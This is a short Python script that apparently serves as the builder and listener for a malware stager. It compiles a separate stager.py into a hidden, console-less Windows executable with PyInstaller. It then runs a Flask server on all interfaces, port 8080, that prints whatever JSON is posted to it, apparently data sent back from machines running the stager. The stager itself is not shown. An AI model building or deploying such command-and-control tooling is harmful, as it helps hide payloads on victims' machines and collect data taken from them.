import subprocess
import  os
import shutil
from flask import Flask,request


def run_flask():
    app = Flask('app')

    @app.route('/',methods = ['GET', 'POST', 'DELETE'])
    def run():
        if request.method == 'GET':
            return '<h1>Hello, Server!</h1>'
        if request.method == 'POST':
            data = request.json
            print(data)
            return data

    
    app.run(host = '0.0.0.0', port = 8080)

def generate_stager():
    ## Convert to exe and save
    if os.path.exists('./tmp'):
        shutil.rmtree('./tmp')

    os.mkdir('./tmp')
    subprocess.call(r"python -m PyInstaller --noconsole --onefile --name stager ../stager.py", cwd=r"./tmp")

def main():
    
    ## Import stager code and convert to exe
    generate_stager()
    
    ## Run a http listsener
    run_flask()

    

    

if __name__=="__main__":
    main()